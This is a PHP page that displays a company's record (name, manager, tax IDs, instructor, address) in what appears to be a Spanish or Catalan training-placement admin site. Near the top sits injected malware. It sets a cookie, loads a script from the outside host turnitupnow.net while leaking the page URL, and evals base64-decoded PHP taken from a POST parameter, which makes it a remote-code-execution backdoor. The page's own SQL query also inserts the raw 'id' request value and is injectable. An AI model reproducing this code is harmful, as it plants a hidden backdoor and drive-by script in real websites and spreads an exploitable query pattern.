<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="resources/estilos.css" rel="stylesheet" type="text/css">

				  <style type="text/css">
<!--
body {
	background-color: #F8F8F8;
}
-->
                  </style>
<?php global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 
include_once("bdd.php");
$id = $_GET['id'];
$result = $db->Execute("SELECT * FROM CDE_empresas_BACK2 WHERE id = $id");

	$id = $result->fields[0];
	$nombre = $result->fields[1];
	$gerente = $result->fields[2];
	$direccion = $result->fields[3];
	$cp = $result->fields[4];
	$poblacion = $result->fields[5];
	$provincia = $result->fields[6];
	$telf1 = $result->fields[7];
	$fax = $result->fields[8];
	$cif = $result->fields[9];
	$curs = $result->fields[10];
	$familia = $result->fields[11];
	$evalua = $result->fields[12];
	$concert = $result->fields[13];
	$nom_comercial = $result->fields['nom_comercial'];
	$activitat = $result->fields['activitat'];
	$nif_gerent = $result->fields['nif_gerent'];
	$instructor = $result->fields['instructor'];
	$nif_instructor = $result->fields['nif_instructor'];
	$carrec_instructor = $result->fields['carrec_instructor'];
	$horari_laboral = $result->fields['horari_laboral'];
	$observacions = $result->fields['observacions'];
	
	$evalua_anterior = $result->fields['evalua_anterior'];

?>
<p>ficha_empresa.php</p>
<table width="590" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td width="291" height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Datos de la Empresa</td>
                    </tr>
                  </table>
				  <table width="590" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                    <tr>
                      <td width="85" height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Nombre</td>
                      <td width="215" bgcolor="#F8F8F8" class="texte_mini"><strong>
                        <label><?php echo utf8_encode($nombre) ?></label>
                      </strong></td>
                      <td width="80" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Fax</td>
                      <td width="120" bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($fax) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Gerente</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($gerente) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;CIF</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($cif) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Dirección</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($direccion) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;Telf 1</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($telf1) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;CP</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($cp) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;Curso</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($curs) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Poblacion</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($poblacion) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                    </tr>
                    <tr>
                      <td height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Provincia</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($provincia) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini"> &nbsp;Ev. Actual</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($evalua) ?></strong></td>
                    </tr>
                    <tr>
                      <td height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Concert</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo $concert ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;Ev. Anterior</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><?php echo utf8_encode($evalua_anterior) ?>&nbsp;</td>
                    </tr>
                    <tr>
                      <td height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;</td>
                    </tr>
                    <tr>
                      <td height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Familia</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><strong><?php echo utf8_encode($familia) ?></strong></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;Nombre comercial</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><?php echo utf8_encode($nom_comercial) ?></td>
                    </tr>
                    <tr>
                      <td height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Actividad</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><?php echo utf8_encode($activitat) ?></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;NIF gerente</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><?php echo utf8_encode($nif_gerent) ?></td>
                    </tr>
                    <tr>
                      <td height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Instructor</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><?php echo utf8_encode($instructor) ?></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;NIF instructor</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><?php echo utf8_encode($nif_instructor) ?></td>
                    </tr>
                    <tr>
                      <td height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Cargo instructor</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><?php echo utf8_encode($carrec_instructor) ?></td>
                      <td bgcolor="#F8F8F8" class="texte_mini">&nbsp;Horario laboral</td>
                      <td bgcolor="#F8F8F8" class="texte_mini"><?php echo utf8_encode($horari_laboral) ?></td>
                    </tr>
                      <td height="25" bgcolor="#F8F8F8" class="texte_mini">&nbsp;Observaciones</td>
                      <td rowspan="3" bgcolor="#F8F8F8" class="texte_mini"><?php echo utf8_encode($observacions) ?></td>
                    </tr>                    
                    </table>
				  